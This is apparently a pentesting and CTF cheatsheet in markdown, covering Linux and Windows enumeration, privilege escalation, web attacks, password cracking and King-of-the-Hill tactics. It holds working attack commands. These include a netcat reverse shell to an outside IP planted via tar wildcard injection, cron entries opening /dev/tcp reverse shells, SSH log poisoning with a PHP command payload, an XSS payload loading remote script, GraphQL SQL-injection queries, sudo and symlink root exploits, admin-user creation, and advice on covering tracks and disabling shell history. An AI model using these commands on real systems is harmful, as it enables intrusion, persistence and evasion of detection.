---
title: "Cheatsheet"
---
## Linux
For complete enumeration tricks, go [here](https://book.hacktricks.xyz/).

### Stablilize Shell
1. ctrl+z
2. stty raw -echo
3. fg (press enter x2)
4. export TERM=xterm , for using `clear` command

### Spawn bash
* `/usr/bin/script -qc /bin/bash 1&>/dev/null`
* `python -c 'import pty;pty.spawn("/bin/bash")'`
* `python3 -c 'import pty;pty.spawn("/bin/bash")'`

### Vulnerable sudo (ALL,!root)
- `sudo -u#-1 whoami`<br />
- `sudo -u#-1 <path_of_executable_as_other_user>`

### Linpeas
```bash
$ wget 10.11.25.205:8080/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh > linlog.txt
$ less -R linlog.txt
```

### Execute as diffent user
```bash
$ sudo -u <user> <command>
```

### FTP
- Connect to ftp on the machine

    ```bash
    $ ftp user <ip>
    $ ftp <ip>
    ```

- Download files:

    ```bash
    # Download all files
    ftp> mget *

    # Download file
    ftp> get file_name
    ```

- Download files recusively:

    ```bash
    $ wget -r ftp://user:pass@<ip>/
    ```


### SMB Shares

- SmbClient

    ```bash
    # Listing all shares
    $ smbclient -L \\\\<ip\\

    # Accessing a share anonymously
    $ smbclient \\\\<ip>\\<share>

    # accessing a share with an authorized user
    $ smbclient \\\\10.10.209.122\\<share> -U <share> 
    ```

- Smbmap

    ```bash
    $ smbmap -u <username> -p <password> -H <ip>
    ```

- Smbget

    ```bash
    $ smbget -R smb://<ip>/<share>
    ```

### NFS shares
```bash
# This lists the nfs shares
$ showmount -e <ip>

# Monting shares
$ mount -t nfs <ip>:/<share_name> <directory_where_to_mount>
```

### Cronjobs

* cronjobs for specific users are stored in `/var/spool/cron/cronjobs/`
* `crontab -u <user> -e ` Check cronjobs for a specific user
* `crontab -l` cronjob for the current user
* `cat /etc/crontab`  system wide cronjobs 
* `/etc/cron.d` or `/etc/cron.daily` or `/etc/cron.hourly` or `/etc/cron.monthly` or `/etc/cron.weekly`
 
### Finding Binaries

* `find . - perm /4000` (user id uid) 
* `find . -perm /2000` (group id guid)
* `find / -perm /6000 2>/dev/null` (SUID and GUID)

### Finding File capabilites
```bash
$ getcap -r / 2>/dev/null
```

### Finding text in a files
```bash
$ grep -rnw '/path/to/somewhere/' -e 'pattern'
```

### Changing file attributes
- `chattr + i filename` making file immutable
- `chattr -i filename` making file mutable
- `lschattr filename` checking file attributes

### Uploading Files
- `scp file/you/want user@ip:/path/to/store `
- `python -m SimpleHTTPServer [port]` By default will listen on 8000
- `python3 -m http.server [port]` By default will listen on 8000

### Downloading Files
```bash
$ wget http://<ip>:port/<file>
```

### Netcat to download files from target
- `nc -l -p [port] > file` Receive file
- `nc -w 3 [ip] [port] < file` Send file 

### Cracking Zip Archive
```bash
$ fcrackzip -u -D -p <path_to_wordlist> <archive.zip>
```

### Cracking Hash
- Hashcat, check the modes [here](https://hashcat.net/wiki/doku.php?id=example_hashes):

    ```bash
    $ hashcat -m <hash_mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
    ```

- John. check the formats [here](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats):

    ```bash
    $ john --format=<format> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ```

### Decrypting PGP key
If you have `asc` key which can be used for PGP authentication then 
* `john key.asc > asc_hash`
* `john asc_hash --wordlists=path_to_wordlist`

#### Having pgp cli
* `pgp --import key.asc`
* `pgp --decrypt file.pgp`

### killing a running job in same shell
```bash
# Find it's job number
$ jobs
[1]+  Running                 sleep 100 &

# Kill the jobs
$ kill %1
[1]+  Terminated              sleep 100
```

### SSH Port Forwarding
```bash
$ ssh -L <port_that_is_blocked_>:localhost:<map_blocked_port> <username>@<ip>
```

### SSH auth log poisoning
- Login as any user to see that it gets logged then try to login with a malicious php code

    ```bash
    $ ssh '<?php system($_GET['a']); ?>'@192.168.43.2
    ```

- Then 

    ```
    http://ip/page?a=whoami;
    ```

### Getting root with ln (symlink)
If we have permissions to run /usr/bin/ln as root we can onw the machine

```bash
$ echo 'bash' > root
$ chmod +x root 
$ sudo /usr/bin/ln -sf /tmp/root /usr/bin/ln
$ sudo /usr/bin/ln
```

### Tar Exploitation
When ever you see a cronjob running with a command `cd /<user>/andre/backup tar -zcf /<folder>/filetar.gz *` go to that folder from which a backup is being created and running these command in that directory 

```bash
$ echo "mkfifo /tmp/lhennp; nc 10.2.54.209 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "" > --checkpoint=1
```

### Binary Exploits (PATH Spoofing)
If there is a certain command running in a binary example `date` so we can create our own binary and add `/bin/bash` to and path so it gets executed
```bash
$ export PATH=<path_where_binary_is>/:$PATH
# Example: `export PATH=/tmp:$PATH`
```

### Postgress
```bash
$ psql

# \list to list the databases
# \c [DATABASE] to select the database [DATABASE]
# \d to list the tables

// Connect 
$ psql -U <user>

// Read files
# CREATE TABLE demo(t text);
# COPY demo from '[FILENAME]';
# SELECT * FROM demo;
```

### SQLite
```bash
$ sqlite3 <filename>

# .tables to get a list of tables.
# SELECT .... to extract the content of a table using SQL.
```

### Recon
- Check `robots.txt` file.
- Check the 404 page.
- Check `security.txt` at `/.well-known/security.txt`.
- Check for directory listing.
- Check common directories (`gobuster` will help).
- Access the default virtual host (the IP). Both HTTP or HTTPS.
- Check the HTTPS certificate.
- Check the HTTP headers.
- Take a screenshoot of massive targets using `aquatone` or `eyewitness`.
    - `eyewitness --web -f targets.txt`/
- Bruteforce vhost and visit it with `curl -H "Host: admin.hackycorp.com" http://hackycorp.com`.
- Trigger error after spam request.
- Check the TXT record. `dig domain.com TXT`.
- Check the bind version using nmap. `nmap -n --script "dns-nsid" z.hackycorp.com`.
- Check the company github repository.
- Check the git log.
- Check difference branch.
- Check the deleted file (check Git section below).
- Check the commit messages.
- Check the aws s3 bucket. Example: `aws s3 cp s3://assets.hackycorp.com/key2.txt .`.


### Enumeration 
* `cat /etc/*release` 
* `cat /etc/issue `
* `cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release`
* `lsb_release -a`
* Running Linpeas
* `ss -tulpn` (for ports that are open on the machine)

### Linux Tips: PTLab
- `cat /home/<user>/<something>`. We can still cat the content if we can't list the content
- Checking `.bash_history`.
- `find /home -name .bash_history`. Finding `.bash_history` file. We can also check for `.zsh_history`, etc.
- `find / -type f -name .bashrc 2>/dev/null`. Finding `.bashrc` file
- `find /home -type f -name .bashrc -exec grep key {} \;`. Finding "key" inside all `.bashrc` file.
- `find . -name .bash_history -exec grep -A 1 '^passwd' {} \;`. Finding line starting with passwd insid `.bash_history`.
- `tar -xzv backup.tgz`. Extract tar.
- `bunzip2 backup.bz2`. Extract bz2.
- OpenSSL encrypt / decrypt:
    - `openssl enc -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz  -out /tmp/backup.tgz.enc` Encrypt
    - `openssl enc -aes256 -d -k P3NT35T3RL48 -in backup.tgz.enc -out abc.tgz`  Decrypt
- If the machine has tomcat installed, check for `tomcat-users.xml` at `/etc/tomcat*`.
- Checking ` /var/lib/mysql/mysql/user.MYD` for passwords.
- Read files if we have access to mysql, `SELECT * LOAD_FILE('/var/lib/mysql-files/key.txt')`.













## Windows
### Adding User
- `net user "USER_NAME" "PASS" /add`

### Changing User's password
- `net user "USER_NAME" "NEWPASS"`

### Adding User to Administrators
- `net localgroup administrators "USER_NAME" /add`

### Changing File Permissions
```powershell
CACLS files /e /p {USERNAME}:{PERMISSION}
# Permissions:
# 1.R `Read`<br/>
# 2.W `Write`<br/>
# 3.C `Change`<br/>
# 4.F `Full Control`
```

### Set File bits
- `attrib +r filename` add read only bit
- `attrib -r filename` remove read only bit
- `attrib +h filename` add hidden bit
- `attrib -h filename` remove hidden bit

### Show hidden file/folder
- `dir /a` show all hidden files & folder
- `dir /a:d` show only hidden folder
- `dir /a:h` show only hidden files

### Downloading Files
- `certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`
- `powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`
- `powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`

### Active Directory
```powershell
powershell -ep bypass  # load a powershell shell with execution policy bypassed 
. .\PowerView.ps1`     # import the PowerView module
```

## List Drives
```powershell
wmic logicaldisk get caption
```

## Decrypting PSCredential Object
* `$file = Import-Clixml -Path <path_to_file>`
* `$file.GetNetworkCredential().username`
* `$file.GetNetworkCredential().password`

## Msfvenom
### List All Payloads
```bash
$ msfvenom -l payloads
```

### List Payload Format
```bash
$ msfvenom --list formats
```

## Meterpreter
### Adding user for RDP
```bash
$ run getgui -u [USER_NAME] -p [PASS]
```

## Git
### Dumping repository
```bash
$ ./gitdumper.sh <location_of_remote_or_local_repostiory_having./.git> <destination_folder>
```

### Extracting information from repository
```bash
$ ./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>
```

### Recover deleted files
```bash
# If you don't remember the exact path/name, search the log for deleted files
git log --diff-filter=D --summary | grep delete

# Find last commit for the deleted file
git rev-list -n 1 HEAD -- $path

# Checkout the commit before the the delete happened
git checkout $commit^ -- $path
```

## Web
### Authorization
- Bypass waf json: 

    ```bash
    $ curl blabla/1 -H 'Accept: application/json'
    ```

### XSS
- Initial foothold using: `1234'"><`.

### XSS to RCE
```bash
# Attacker:
while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done

#Victim: 
<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
```

### SQL Map
```bash
$ sqlmap -r request.txt --dbms=mysql --dump
```

### Wfuzz
```bash
$ wfuzz -c -z file,wordlist.txt --hh=0  http://<ip>/<path>/?date=FUZZ
```

### API (Applicaton Programmable Interface)
* Check for possibility if there is a v1 , it is likely to be vulnerable to LFI 
* Use `wfuzz` which is tool to fuzz for API end points or for parameter:

    ```bash
    $ wfuzz -u http://<ip>:<port>/<api-endpoint>\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
    ```

    Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_history` "?" is before the parameter and FUZZ is telling to find a parameter and we are looking for `.bash_hitory` as an example

### Web Shell Bash
```bash
$ bash -c "<bash_rev_shell>"
```

### GraphQL
- Get metadata about the information available.
    - For older versions:

        ```javascript
        query IntrospectionQuery {
            __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
                ...FullType
            }
            directives {
                name
                description
                args {
                ...InputValue
                }
                onOperation
                onFragment
                onField
            }
            }
        }

        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
            }
            inputFields {
            ...InputValue
            }
            interfaces {
            ...TypeRef
            }
            enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
            }
            possibleTypes {
            ...TypeRef
            }
        }

        fragment InputValue on __InputValue {
            name
            description
            type { ...TypeRef }
            defaultValue
        }

        fragment TypeRef on __Type {
            kind
            name
            ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                kind
                name
                }
            }
            }
        }
        ```


    - For more recent versions:

        ```javascript
        query IntrospectionQuery {
            __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
                ...FullType
            }
            directives {
                name
                description
                args {
                ...InputValue
                }
                locations
            }
            }
        }

        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
            }
            inputFields {
            ...InputValue
            }
            interfaces {
            ...TypeRef
            }
            enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
            }
            possibleTypes {
            ...TypeRef
            } 
        }   
            
        fragment InputValue on __InputValue {
            name
            description
            type { ...TypeRef }
            defaultValue
        }     
                
        fragment TypeRef on __Type {
            kind
            name
            ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                kind
                name
                }
            }
            } 
        } 
        ```    

    - To get more details:
        
        ```javascript
        query MyQuery {
        __schema {
            types {
            name
            fields {
            name
            } 
            
            }
        }
        }
        ```

    - Using one of these queries, you should get a list of queries that you can run in place of the getprojects used by the application.

        ```javascript
        query Query {
        [NAME] {
            id
        }
        }
        ```

- Injection.
    - Example for SQLite UNION method:

```javascript
// Identify columns
query MyQuery {
  project(id: "1 union SELECT 1,2,3--") {
    id
    name
    description
  }
}


// Get the databases
query MyQuery {
  project(id: "1 union SELECT 1,2,group_concat(tbl_name) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'") {
    id
    name
    description
  }
}


// Get the columns
query MyQuery {
  project(id: "1 union SELECT 1,2,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='ptlabiikey'") {
    id
    name
    description
  }
}


// Get the key
query MyQuery {
  project(id: "1 union SELECT 1,2,value FROM ptlabiikey") {
    id
    name
    description
  }
}
```









### Wordpress
using wpscan we can find users or do some further enumeration of wordpress version
* `wpscan --url http://<ip>/wordpress -e u` Enumerate Users
* `wpscan --url http://<ip>/wordpress -e ap` Enumearte All plugins

To bruteforce passwords
* `wpscan --url <ip> -U user_file_path -P password_file_path`

After logging into the wordpress dashboard , we can edit theme's 404.php page with a php revershell
`http://<ip>/wordpress/wp-content/themes/twentytwenty/404.php`

## Directory Bruteforcing
### Wordlists
* `/usr/share/wordlists/dirb/big.txt`
* `/usr/share/wordlists/dirb/common.txt`
* `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

### Gobuster
* `gobuster dir -u http://<ip>/ -w <path_to_wordlist>`
* `gobuster dir -u http://<ip>/ -w <path_to_wordlist> -s "204,301,302,307,401,403"` (use status code if 200 is configured to respond on the web server to every get request)
* `gobuster vhost -u http://<ip>/ -w <path_to_wordlist>` for vhost.

### Feroxbuster
```bash
$ feroxbuster -u http://<ip>/ -w <path_to_wordlist>
```

### Dirsearch
```bash
# Full scan with recursive
$ dirsearch -u https://wuvel.net -e html,txt,php,jpg,jpeg,png,css,js,bak,conf,ini,md -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r

# Deeper recursive
$ dirsearch -u https://wuvel.net -e html,txt,php,jpg,jpeg,png,css,js,bak,conf,ini,md -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -R 3

# Excluding all the codes after -x flag
$ dirsearch -u https://wuvel.net -e html,txt,php,jpg,jpeg,png,css,js,bak,conf,ini,md -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403,301,302
```

### Credential Bruteforcing
* `/usr/share/wordlists/rockyou.txt`
* `/usr/share/wordlists/fastrack.txt`
* using `crackstation`
* using `seclists`

## Generating Wordlists 
### Cewl 
This spiders the given url and finding keyowrds then makes a wordlists through it's findings.

```bash
$ cewl <URL>
<ip>
```

## DNS
### Finding Subdomains
```bash
$ wfuzz -c -w <path_to_wordlist> -u 'http://domain.com -H 'Host: FUZZ.domain.com
```

### Zone Transfer
If there is a port 53 open on the machine you could do a zone transfer to get information about DNS records

```bash
$ dig axfr @<ip> <domain_name>
```

Zone transfer on the internal zone "int".

```bash
$ dig axfr @z.hackycorp.com int
```

## Android
- Checking `AndroidManifest.xml` file and checking the `res/values/strings.xml` file.
    - `apktool -d <filename>`
    - Unzip the apk, `d2j-dex2jar classes.dex`, unzip the jar, and decompile the class using `jad <filename>`.
        - Download the dex2jar [here](https://sourceforge.net/projects/dex2jar/).
        - Download the jad [here](https://varaneckas.com/jad/).
- Check for the `assets` directory for important files from the Android Manifest file.
- Check files inside `/smali` directory.
    - Files starting with R, usually it's the UI.







## King Of The Hill (KoTH)
### Monitoring and Closing Shell (Linux)
* strace `debugging / tamper with processes`
* gbd `c/c++ debugger`
* script - records terminal activites
* w /who `check current pts ,terminal device`
* ps -t ps/pts-number `process monitoring`
* script /dev/pts/pts-number `montior terminal`
* cat /dev/urandom > /dev/pts/pts-number  2>/dev/null `prints arbitary text on terminal`
* pkill -9 -t pts/pts-number
* Add this in root's crontab (crontab -e) <br />
```
*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
```
Or you can add in system wide contab (nano /etc/crontab)

```
*/1 * * * *     root    /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
```
### Change SSH port
`nano /etc/ssh/sshd_config` (change PORT 22 to any port you want also you can tinker with configuration file)
`service sshd restart`     (Restart SSH service to apply changes)
### Hide yourself from "w" or "who"
`ssh user@ip -T` This -T will have some limiations , that you cannot run bash and some other commands but is helpful.

### Run Bash script on king.txt
`while [ 1 ]; do /root/chattr -i king.txt; done &`

### Send messages to logged in users
* echo "msg" > /dev/pts/pts-number `send message to specific user`<br />
* wall msg `boradcast message to everyone`<br />
  
### Closing Session (Windows)
* quser
* logoff id|user_name  

# Covering Track
11.11. Covering our Tracks

The final stages of penetration testing involve setting up persistence and covering our tracks. For today's material, we'll detail the later as this is not mentioned nearly enough.

During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.

On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. Some log files of interest:

    "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
<img src="https://imgur.com/37aTxnI.png/>
          
    "/var/log/syslog" (System events such as firewall alerts:)
<img src="https://imgur.com/k7scyUP.png/>    
    "/var/log/<service/"
    For example, the access logs of apache2
        /var/log/apache2/access.log
<img src="https://imgur.com/y8Rin3h.png/>
          


# Miscellaneous

### Turning off xfce beeping sound
`xset b off`

export HISTFILE=/dev/null found this it might help you out a little when doing KOTH it basically stops bash logging your commands in the ~/.bash_history file <br/>
sudo ifconfig tun0 down<br/>
sudo ip link set tun0 down<br/>
sudo ip link delete tun0<br/>
sudo systemctl restart systemd-networkd ; sudo systemctl status systemd-networkd<br/>

### Allow restricted ports at Mozilla Firefox
- `about:config`
- `network.security.ports.banned.override` Set your port in string